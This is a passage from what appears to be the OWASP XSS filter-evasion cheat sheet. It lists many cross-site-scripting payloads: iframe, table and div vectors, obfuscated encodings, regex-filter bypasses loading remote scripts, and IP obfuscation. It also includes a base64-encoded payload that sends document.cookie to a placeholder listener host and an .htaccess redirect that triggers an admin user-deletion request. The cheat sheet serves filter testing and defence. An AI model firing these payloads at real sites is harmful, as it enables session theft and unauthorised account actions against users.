<p>If iFrames are allowed there are a lot of other XSS problems as well:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">IFRAME</span><span class="na">SRC</span><span class="o">=</span><span class="s">&quot;javascript:alert(&#39;XSS&#39;);&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">IFRAME</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="iframe-event-based">IFRAME Event Based<a class="headerlink" href="#iframe-event-based" title="Permanent link">&para;</a></h3>
<p>IFrames and most other elements can use event based mayhem like the following:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">IFRAME</span><span class="na">SRC</span><span class="o">=</span><span class="s">#</span><span class="na">onmouseover</span><span class="o">=</span><span class="s">&quot;alert(document.cookie)&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">IFRAME</span><span class="p">&gt;</span>
</code></pre></div>
<p>(Submitted by: David Cross)</p>
<h3 id="frame">FRAME<a class="headerlink" href="#frame" title="Permanent link">&para;</a></h3>
<p>Frames have the same sorts of XSS problems as iFrames</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">FRAMESET</span><span class="p">&gt;&lt;</span><span class="nt">FRAME</span><span class="na">SRC</span><span class="o">=</span><span class="s">&quot;javascript:alert(&#39;XSS&#39;);&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">FRAMESET</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="table">TABLE<a class="headerlink" href="#table" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">TABLE</span><span class="na">BACKGROUND</span><span class="o">=</span><span class="s">&quot;javascript:alert(&#39;XSS&#39;)&quot;</span><span class="p">&gt;</span>
</code></pre></div>
<h4 id="td">TD<a class="headerlink" href="#td" title="Permanent link">&para;</a></h4>
<p>Just like above, TD's are vulnerable to BACKGROUNDs containing JavaScript XSS vectors:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">TABLE</span><span class="p">&gt;&lt;</span><span class="nt">TD</span><span class="na">BACKGROUND</span><span class="o">=</span><span class="s">&quot;javascript:alert(&#39;XSS&#39;)&quot;</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="div">DIV<a class="headerlink" href="#div" title="Permanent link">&para;</a></h3>
<h4 id="div-background-image">DIV Background-image<a class="headerlink" href="#div-background-image" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">DIV</span><span class="na">STYLE</span><span class="o">=</span><span class="s">&quot;background-image:url(javascript:alert(&#39;XSS&#39;))&quot;</span><span class="p">&gt;</span>
</code></pre></div>
<h4 id="div-background-image-with-unicode-xss-exploit">DIV Background-image with Unicode XSS Exploit<a class="headerlink" href="#div-background-image-with-unicode-xss-exploit" title="Permanent link">&para;</a></h4>
<p>This has been modified slightly to obfuscate the URL parameter:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">DIV</span><span class="na">STYLE</span><span class="o">=</span><span class="s">&quot;background-image:\0075\0072\006C\0028&#39;\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029&#39;\0029&quot;</span><span class="p">&gt;</span>
</code></pre></div>
<p>(Original vulnerability was found by Renaud Lifchitz as a vulnerability in Hotmail)</p>
<h4 id="div-background-image-plus-extra-characters">DIV Background-image Plus Extra Characters<a class="headerlink" href="#div-background-image-plus-extra-characters" title="Permanent link">&para;</a></h4>
<p>RSnake built a quick XSS fuzzer to detect any erroneous characters that are allowed after the open parenthesis but before the JavaScript directive in IE. These are in decimal but you can include hex and add padding of course. (Any of the following chars can be used: 1-32, 34, 39, 160, 8192-8.13, 12288, 65279):</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">DIV</span><span class="na">STYLE</span><span class="o">=</span><span class="s">&quot;background-image:url(javascript:alert(&#39;XSS&#39;))&quot;</span><span class="p">&gt;</span>
</code></pre></div>
<h4 id="div-expression">DIV Expression<a class="headerlink" href="#div-expression" title="Permanent link">&para;</a></h4>
<p>A variant of this attack was effective against a real-world XSS filter by using a newline between the colon and <code>expression</code>:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">DIV</span><span class="na">STYLE</span><span class="o">=</span><span class="s">&quot;width:expression(alert(&#39;XSS&#39;));&quot;</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="downlevel-hidden-block">Downlevel-Hidden Block<a class="headerlink" href="#downlevel-hidden-block" title="Permanent link">&para;</a></h3>
<p>Only works on the IE rendering engine - Trident. Some websites consider anything inside a comment block to be safe and therefore does not need to be removed, which allows our XSS vector to exist. Or the system might try to add comment tags around something in a vain attempt to render it harmless. As we can see, that probably wouldn't do the job:</p>
<div class="highlight"><pre><span></span><code><span class="c">&lt;!--</span><span class="p">[</span><span class="k">if</span><span class="w"></span><span class="nx">gte</span><span class="w"></span><span class="nx">IE</span><span class="w"></span><span class="mf">4</span><span class="p">]</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">SCRIPT</span><span class="o">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;XSS&#39;</span><span class="p">);</span><span class="o">&lt;</span><span class="err">/SCRIPT&gt;</span>
<span class="o">&lt;!</span><span class="p">[</span><span class="nx">endif</span><span class="p">]</span><span class="o">--&gt;</span>
</code></pre></div>
<h3 id="base-tag">BASE Tag<a class="headerlink" href="#base-tag" title="Permanent link">&para;</a></h3>
<p>(Works on IE in safe mode) This attack needs the <code>//</code> to comment out the next characters so you won't get a JavaScript error and your XSS tag will render. Also, this relies on the fact that many websites uses dynamically placed images like <code>images/image.jpg</code> rather than full paths. If the path includes a leading forward slash like <code>/images/image.jpg</code>, you can remove one slash from this vector (as long as there are two to begin the comment this will work):</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">BASE</span><span class="na">HREF</span><span class="o">=</span><span class="s">&quot;javascript:alert(&#39;XSS&#39;);//&quot;</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="object-tag">OBJECT Tag<a class="headerlink" href="#object-tag" title="Permanent link">&para;</a></h3>
<p>If the system allows objects, you can also inject virus payloads that can infect the users, etc with the APPLET tag. The linked file is actually an HTML file that can contain your XSS:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">OBJECT</span><span class="na">TYPE</span><span class="o">=</span><span class="s">&quot;text/x-scriptlet&quot;</span><span class="na">DATA</span><span class="o">=</span><span class="s">&quot;http://xss.rocks/scriptlet.html&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">OBJECT</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="embed-svg-which-contains-xss-vector">EMBED SVG Which Contains XSS Vector<a class="headerlink" href="#embed-svg-which-contains-xss-vector" title="Permanent link">&para;</a></h3>
<p>This attack only works in Firefox:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">EMBED</span><span class="na">SRC</span><span class="o">=</span><span class="s">&quot;data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlhTUyIpOzwvc2NyaXB0Pjwvc3ZnPg==&quot;</span><span class="na">type</span><span class="o">=</span><span class="s">&quot;image/svg+xml&quot;</span><span class="na">AllowScriptAccess</span><span class="o">=</span><span class="s">&quot;always&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">EMBED</span><span class="p">&gt;</span>
</code></pre></div>
<p>(Thanks to nEUrOO for this one)</p>
<h3 id="xml-data-island-with-cdata-obfuscation">XML Data Island with CDATA Obfuscation<a class="headerlink" href="#xml-data-island-with-cdata-obfuscation" title="Permanent link">&para;</a></h3>
<p>This XSS attack works only in IE:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">XML</span><span class="na">ID</span><span class="o">=</span><span class="s">&quot;xss&quot;</span><span class="p">&gt;&lt;</span><span class="nt">I</span><span class="p">&gt;&lt;</span><span class="nt">B</span><span class="p">&gt;&lt;</span><span class="nt">IMG</span><span class="na">SRC</span><span class="o">=</span><span class="s">&quot;javas&lt;!----&gt;cript:alert(&#39;XSS&#39;)&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">B</span><span class="p">&gt;&lt;/</span><span class="nt">I</span><span class="p">&gt;&lt;/</span><span class="nt">XML</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">SPAN</span><span class="na">DATASRC</span><span class="o">=</span><span class="s">&quot;#xss&quot;</span><span class="na">DATAFLD</span><span class="o">=</span><span class="s">&quot;B&quot;</span><span class="na">DATAFORMATAS</span><span class="o">=</span><span class="s">&quot;HTML&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">SPAN</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="locally-hosted-xml-with-embedded-javascript-that-is-generated-using-an-xml-data-island">Locally hosted XML with embedded JavaScript that is generated using an XML data island<a class="headerlink" href="#locally-hosted-xml-with-embedded-javascript-that-is-generated-using-an-xml-data-island" title="Permanent link">&para;</a></h3>
<p>This attack is nearly the same as above, but instead it refers to a locally hosted (on the same server) XML file that will hold your XSS vector. You can see the result here:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">XML</span><span class="na">SRC</span><span class="o">=</span><span class="s">&quot;xsstest.xml&quot;</span><span class="na">ID</span><span class="o">=</span><span class="s">I</span><span class="p">&gt;&lt;/</span><span class="nt">XML</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">SPAN</span><span class="na">DATASRC</span><span class="o">=</span><span class="s">#I</span><span class="na">DATAFLD</span><span class="o">=</span><span class="s">C</span><span class="na">DATAFORMATAS</span><span class="o">=</span><span class="s">HTML</span><span class="p">&gt;&lt;/</span><span class="nt">SPAN</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="htmltime-in-xml">HTML+TIME in XML<a class="headerlink" href="#htmltime-in-xml" title="Permanent link">&para;</a></h3>
<p>This attack only works in IE and remember that you need to be between HTML and BODY tags for this to work:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">HTML</span><span class="p">&gt;&lt;</span><span class="nt">BODY</span><span class="p">&gt;</span>
<span class="err">&lt;</span>?xml:namespaceprefix=&quot;t&quot;ns=&quot;urn:schemas-microsoft-com:time&quot;&gt;
<span class="err">&lt;</span>?importnamespace=&quot;t&quot;implementation=&quot;#default#time2&quot;&gt;
<span class="p">&lt;</span><span class="nt">t:set</span><span class="na">attributeName</span><span class="o">=</span><span class="s">&quot;innerHTML&quot;</span><span class="na">to</span><span class="o">=</span><span class="s">&quot;XSS&lt;SCRIPTDEFER&gt;alert(&quot;</span><span class="na">XSS</span><span class="err">&quot;)&lt;/</span><span class="na">SCRIPT</span><span class="p">&gt;</span>&quot;&gt;
<span class="p">&lt;/</span><span class="nt">BODY</span><span class="p">&gt;&lt;/</span><span class="nt">HTML</span><span class="p">&gt;</span>
</code></pre></div>
<p>(This is how Grey Magic hacked Hotmail and Yahoo!)</p>
<h3 id="assuming-you-can-only-fit-in-a-few-characters-and-it-filters-against-js">Assuming you can only fit in a few characters and it filters against <code>.js</code><a class="headerlink" href="#assuming-you-can-only-fit-in-a-few-characters-and-it-filters-against-js" title="Permanent link">&para;</a></h3>
<p>This attack allows you to rename your JavaScript file to an image as an XSS vector:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">SCRIPT</span><span class="na">SRC</span><span class="o">=</span><span class="s">&quot;http://xss.rocks/xss.jpg&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">SCRIPT</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="ssi-server-side-includes">SSI (Server Side Includes)<a class="headerlink" href="#ssi-server-side-includes" title="Permanent link">&para;</a></h3>
<p>This requires SSI to be installed on the server to use this XSS vector. I probably don't need to mention this, but if you can run commands on the server there are no doubt much more serious issues:</p>
<div class="highlight"><pre><span></span><code><span class="c">&lt;!--</span><span class="err">#</span><span class="nx">exec</span><span class="w"></span><span class="nx">cmd</span><span class="o">=</span><span class="s2">&quot;/bin/echo&#39;&lt;SCR&#39;&quot;</span><span class="o">--&gt;</span><span class="c">&lt;!--</span><span class="err">#</span><span class="nx">exec</span><span class="w"></span><span class="nx">cmd</span><span class="o">=</span><span class="s2">&quot;/bin/echo&#39;IPTSRC=http://xss.rocks/xss.js&gt;&lt;/SCRIPT&gt;&#39;&quot;</span><span class="o">--&gt;</span>
</code></pre></div>
<h3 id="php">PHP<a class="headerlink" href="#php" title="Permanent link">&para;</a></h3>
<p>This attack requires PHP to be installed on the server. Again, if you can run any scripts remotely like this, there are probably much more dire issues:</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?</span><span class="k">echo</span><span class="p">(</span><span class="s1">&#39;&lt;SCR)&#39;</span><span class="p">;</span>
<span class="k">echo</span><span class="p">(</span><span class="s1">&#39;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&#39;</span><span class="p">);</span><span class="cp">?&gt;</span>
</code></pre></div>
<h3 id="img-embedded-commands">IMG Embedded Commands<a class="headerlink" href="#img-embedded-commands" title="Permanent link">&para;</a></h3>
<p>This attack only works when this is injected (like a web-board) in a web page behind password protection and that password protection works with other commands on the same domain. This can be used to delete users, add users (if the user who visits the page is an administrator), send credentials elsewhere, etc. This is one of the lesser used but more useful XSS vectors:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">IMG</span><span class="na">SRC</span><span class="o">=</span><span class="s">&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;</span><span class="p">&gt;</span>
</code></pre></div>
<h4 id="img-embedded-commands-part-ii">IMG Embedded Commands part II<a class="headerlink" href="#img-embedded-commands-part-ii" title="Permanent link">&para;</a></h4>
<p>This is more scary because there are absolutely no identifiers that make it look suspicious other than it is not hosted on your own domain. The vector uses a 302 or 304 (others work too) to redirect the image back to a command. So a normal <code>&lt;IMG SRC="httx://badguy.com/a.jpg"&gt;</code> could actually be an attack vector to run commands as the user who views the image link. Here is the <code>.htaccess</code> (under Apache) line to accomplish the vector:</p>
<div class="highlight"><pre><span></span><code>Redirect302/a.jpghttp://victimsite.com/admin.asp&amp;deleteuser
</code></pre></div>
<p>(Thanks to Timo for part of this)</p>
<h3 id="cookie-manipulation">Cookie Manipulation<a class="headerlink" href="#cookie-manipulation" title="Permanent link">&para;</a></h3>
<p>This method is pretty obscure but there are a few examples where <code>&lt;META</code> is allowed and it can be used to overwrite cookies. There are other examples of sites where instead of fetching the username from a database it is stored inside of a cookie to be displayed only to the user who visits the page. With these two scenarios combined you can modify the victim's cookie which will be displayed back to them as JavaScript (you can also use this to log people out or change their user states, get them to log in as you, etc):</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">META</span><span class="na">HTTP-EQUIV</span><span class="o">=</span><span class="s">&quot;Set-Cookie&quot;</span><span class="na">Content</span><span class="o">=</span><span class="s">&quot;USERID=&lt;SCRIPT&gt;alert(&#39;XSS&#39;)&lt;/SCRIPT&gt;&quot;</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="xss-using-html-quote-encapsulation">XSS Using HTML Quote Encapsulation<a class="headerlink" href="#xss-using-html-quote-encapsulation" title="Permanent link">&para;</a></h3>
<p>This attack was originally tested in IE so your mileage may vary. For performing XSS on sites that allow <code>&lt;SCRIPT&gt;</code> but don't allow <code>&lt;SCRIPT SRC...</code> by way of a regex filter <code>/\&lt;script\[^\&gt;\]+src/i</code>, do the following:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">SCRIPT</span><span class="na">a</span><span class="o">=</span><span class="s">&quot;&gt;&quot;</span><span class="na">SRC</span><span class="o">=</span><span class="s">&quot;httx://xss.rocks/xss.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">SCRIPT</span><span class="p">&gt;</span>
</code></pre></div>
<p>If you are performing XSS on sites that allow <code>&lt;SCRIPT&gt;</code> but don't allow <code>\&lt;script src...</code> due to a regex filter that does <code>/\&lt;script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\&gt;\\s\]+))?)+\\s\*|\\s\*)src/i</code> (This is an important one, because this regex has been seen in the wild):</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">SCRIPT</span><span class="err">=&quot;</span><span class="p">&gt;</span><span class="s2">&quot;SRC=&quot;</span><span class="nx">httx</span><span class="o">:</span><span class="c1">//xss.rocks/xss.js&quot;&gt;</span><span class="p">&lt;/</span><span class="nt">SCRIPT</span><span class="p">&gt;</span>
</code></pre></div>
<p>Another XSS to evade the same filter: <code>/\&lt;script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\&gt;\\s\]+))?)+\\s\*|\\s\*)src/i</code>:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">SCRIPT</span><span class="na">a</span><span class="o">=</span><span class="s">&quot;&gt;&quot;</span><span class="err">&#39;&#39;</span><span class="na">SRC</span><span class="o">=</span><span class="s">&quot;httx://xss.rocks/xss.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">SCRIPT</span><span class="p">&gt;</span>
</code></pre></div>
<p>Yet another XSS that evades the same filter: <code>/\&lt;script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\&gt;\\s\]+))?)+\\s\*|\\s\*)src/i</code></p>
<p>Generally, we are not discussing mitigation techniques, but the only thing that stops this XSS example is, if you still want to allow <code>&lt;SCRIPT&gt;</code> tags but not remote script is a state machine (and of course there are other ways to get around this if they allow <code>&lt;SCRIPT&gt;</code> tags), use this:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">SCRIPT</span><span class="err">&quot;</span><span class="na">a</span><span class="o">=</span><span class="s">&#39;&gt;&#39;</span><span class="err">&quot;</span><span class="na">SRC</span><span class="o">=</span><span class="s">&quot;httx://xss.rocks/xss.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">SCRIPT</span><span class="p">&gt;</span>
</code></pre></div>
<p>And one last XSS attack to evade, <code>/\&lt;script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\&gt;\\s\]+))?)+\\s\*|\\s\*)src/i</code> using grave accents (again, doesn't work in Firefox):</p>
<!-- markdownlint-disable MD038-->
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">SCRIPT</span><span class="na">a</span><span class="o">=</span><span class="s">`</span><span class="p">&gt;</span><span class="sb">`SRC=&quot;httx://xss.rocks/xss.js&quot;&gt;</span><span class="p">&lt;/</span><span class="nt">SCRIPT</span><span class="p">&gt;</span>
</code></pre></div>
<!-- markdownlint-enable MD038-->

<p>Here's an XSS example which works if the regex won't catch a matching pair of quotes but instead will find any quotes to terminate a parameter string improperly:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">SCRIPT</span><span class="na">a</span><span class="o">=</span><span class="s">&quot;&gt;&#39;&gt;&quot;</span><span class="na">SRC</span><span class="o">=</span><span class="s">&quot;httx://xss.rocks/xss.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">SCRIPT</span><span class="p">&gt;</span>
</code></pre></div>
<p>This XSS still worries me, as it would be nearly impossible to stop this without blocking all active content:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">SCRIPT</span><span class="p">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&quot;&lt;SCRI&quot;</span><span class="p">);&lt;/</span><span class="nt">SCRIPT</span><span class="p">&gt;</span>PTSRC=&quot;httx://xss.rocks/xss.js&quot;&gt;<span class="p">&lt;/</span><span class="nt">SCRIPT</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="url-string-evasion">URL String Evasion<a class="headerlink" href="#url-string-evasion" title="Permanent link">&para;</a></h3>
<p>The following attacks work if <code>http://www.google.com/</code> is programmatically disallowed:</p>
<h4 id="ip-versus-hostname">IP Versus Hostname<a class="headerlink" href="#ip-versus-hostname" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">A</span><span class="na">HREF</span><span class="o">=</span><span class="s">&quot;http://66.102.7.147/&quot;</span><span class="p">&gt;</span>XSS<span class="p">&lt;/</span><span class="nt">A</span><span class="p">&gt;</span>
</code></pre></div>
<h4 id="url-encoding">URL Encoding<a class="headerlink" href="#url-encoding" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">A</span><span class="na">HREF</span><span class="o">=</span><span class="s">&quot;http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D&quot;</span><span class="p">&gt;</span>XSS<span class="p">&lt;/</span><span class="nt">A</span><span class="p">&gt;</span>
</code></pre></div>
<h4 id="dword-encoding">DWORD Encoding<a class="headerlink" href="#dword-encoding" title="Permanent link">&para;</a></h4>
<p>Note: there are other of variations of DWORD encoding - see the IP Obfuscation calculator below for more details:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">A</span><span class="na">HREF</span><span class="o">=</span><span class="s">&quot;http://1113982867/&quot;</span><span class="p">&gt;</span>XSS<span class="p">&lt;/</span><span class="nt">A</span><span class="p">&gt;</span>
</code></pre></div>
<h4 id="hex-encoding">Hex Encoding<a class="headerlink" href="#hex-encoding" title="Permanent link">&para;</a></h4>
<p>The total size of each number allowed is somewhere in the neighborhood of 240 total characters as you can see on the second digit, and since the hex number is between 0 and F the leading zero on the third hex quote is not required:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">A</span><span class="na">HREF</span><span class="o">=</span><span class="s">&quot;http://0x42.0x0000066.0x7.0x93/&quot;</span><span class="p">&gt;</span>XSS<span class="p">&lt;/</span><span class="nt">A</span><span class="p">&gt;</span>
</code></pre></div>
<h4 id="octal-encoding">Octal Encoding<a class="headerlink" href="#octal-encoding" title="Permanent link">&para;</a></h4>
<p>Again padding is allowed, although you must keep it above 4 total characters per class - as in class A, class B, etc:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">A</span><span class="na">HREF</span><span class="o">=</span><span class="s">&quot;http://0102.0146.0007.00000223/&quot;</span><span class="p">&gt;</span>XSS<span class="p">&lt;/</span><span class="nt">A</span><span class="p">&gt;</span>
</code></pre></div>
<h4 id="base64-encoding">Base64 Encoding<a class="headerlink" href="#base64-encoding" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">img</span><span class="na">onload</span><span class="o">=</span><span class="s">&quot;eval(atob(&#39;ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU=&#39;))&quot;</span><span class="p">&gt;</span>
</code></pre></div>
<h4 id="mixed-encoding">Mixed Encoding<a class="headerlink" href="#mixed-encoding" title="Permanent link">&para;</a></h4>
<p>Let's mix and match base encoding and throw in some tabs and newlines (why browsers allow this, I'll never know). The tabs and newlines only work if this is encapsulated with quotes:</p>
<!-- markdownlint-disable MD010-->
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">A</span><span class="na">HREF</span><span class="o">=</span><span class="s">&quot;h</span>
<span class="s">ttp://6   6.000146.0x7.147/&quot;</span><span class="p">&gt;</span>XSS<span class="p">&lt;/</span><span class="nt">A</span><span class="p">&gt;</span>
</code></pre></div>
<!-- markdownlint-enable MD010-->

<h4 id="protocol-resolution-bypass">Protocol Resolution Bypass<a class="headerlink" href="#protocol-resolution-bypass" title="Permanent link">&para;</a></h4>
<p><code>//</code> translates to <code>http://</code>, which saves a few more bytes. This is really handy when space is an issue too (two less characters can go a long way) and can easily bypass regex like <code>(ht|f)tp(s)?://</code> (thanks to Ozh for part of this one). You can also change the <code>//</code> to <code>\\\\</code>. You do need to keep the slashes in place, however, otherwise this will be interpreted as a relative path URL:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">A</span><span class="na">HREF</span><span class="o">=</span><span class="s">&quot;//www.google.com/&quot;</span><span class="p">&gt;</span>XSS<span class="p">&lt;/</span><span class="nt">A</span><span class="p">&gt;</span>
</code></pre></div>
<h4 id="removing-cnames">Removing CNAMEs<a class="headerlink" href="#removing-cnames" title="Permanent link">&para;</a></h4>
<p>When combined with the above URL, removing <code>www.</code> will save an additional 4 bytes for a total byte savings of 9 for servers that have set this up properly:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">A</span><span class="na">HREF</span><span class="o">=</span><span class="s">&quot;http://google.com/&quot;</span><span class="p">&gt;</span>XSS<span class="p">&lt;/</span><span class="nt">A</span><span class="p">&gt;</span>
</code></pre></div>
<p>Extra dot for absolute DNS:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">A</span><span class="na">HREF</span><span class="o">=</span><span class="s">&quot;http://www.google.com./&quot;</span><span class="p">&gt;</span>XSS<span class="p">&lt;/</span><span class="nt">A</span><span class="p">&gt;</span>
</code></pre></div>
<h4 id="javascript-link-location">JavaScript Link Location<a class="headerlink" href="#javascript-link-location" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">A</span><span class="na">HREF</span><span class="o">=</span><span class="s">&quot;javascript:document.location=&#39;http://www.google.com/&#39;&quot;</span><span class="p">&gt;</span>XSS<span class="p">&lt;/</span><span class="nt">A</span><span class="p">&gt;</span>
</code></pre></div>
<h4 id="content-replace-as-attack-vector">Content Replace as Attack Vector<a class="headerlink" href="#content-replace-as-attack-vector" title="Permanent link">&para;</a></h4>
<!-- markdownlint-disable MD010-->
<p>Assuming <code>http://www.google.com/</code> is programmatically replaced with nothing. A similar attack vector has been used against several separate real world XSS filters by using the conversion filter itself (here is an example) to help create the attack vector <code>java&amp;\#x09;script:</code> was converted into <code>java    script:</code>, which renders in IE:</p>
<!-- markdownlint-enable MD010-->

<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">A</span><span class="na">HREF</span><span class="o">=</span><span class="s">&quot;http://www.google.com/ogle.com/&quot;</span><span class="p">&gt;</span>XSS<span class="p">&lt;/</span><span class="nt">A</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="assisting-xss-with-http-parameter-pollution">Assisting XSS with HTTP Parameter Pollution<a class="headerlink" href="#assisting-xss-with-http-parameter-pollution" title="Permanent link">&para;</a></h3>
<p>If a content sharing flow on a web site is implemented as shown below, this attack will work. There is a <code>Content</code> page which includes some content provided by users and this page also includes a link to <code>Share</code> page which enables a user choose their favorite social sharing platform to share it on. Developers HTML encoded the <code>title</code> parameter in the <code>Content</code> page to prevent against XSS but for some reasons they didn't URL encoded this parameter to prevent from HTTP Parameter Pollution. Finally they decide that since <code>content_type</code>'s value is a constant and will always be integer, they didn't encode or validate the <code>content_type</code> in the <code>Share</code> page.</p>
<h4 id="content-page-source-code">Content Page Source Code<a class="headerlink" href="#content-page-source-code" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code>a href=&quot;/Share?content_type=1<span class="err">&amp;</span>title=<span class="err">&lt;</span>%=Encode.forHtmlAttribute(untrusted content title)%&gt;&quot;&gt;Share<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</code></pre></div>
<h4 id="share-page-source-code">Share Page Source Code<a class="headerlink" href="#share-page-source-code" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">contentType</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&lt;%=</span><span class="nx">Request</span><span class="p">.</span><span class="nx">getParameter</span><span class="p">(</span><span class="s2">&quot;content_type&quot;</span><span class="p">)</span><span class="o">%&gt;</span><span class="p">;</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">title</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&lt;%=Encode.forJavaScript(request.getParameter(&quot;</span><span class="nx">title</span><span class="s2">&quot;))%&gt;&quot;</span><span class="p">;</span>
<span class="p">...</span>
<span class="c1">//some user agreement and sending to server logic might be here</span>
<span class="p">...</span>
<span class="o">&lt;</span><span class="err">/script&gt;</span>
</code></pre></div>
<h4 id="content-page-output">Content Page Output<a class="headerlink" href="#content-page-output" title="Permanent link">&para;</a></h4>
<p>If attacker set the untrusted content title as <code>This is a regular title&amp;content_type=1;alert(1)</code> the link in <code>Content</code> page would be this:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;/share?content_type=1&amp;title=This is a regular title&amp;amp;content_type=1;alert(1)&quot;</span><span class="p">&gt;</span>Share<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</code></pre></div>
<h4 id="share-page-output">Share Page Output<a class="headerlink" href="#share-page-output" title="Permanent link">&para;</a></h4>
<p>And in share page output could be this:</p>
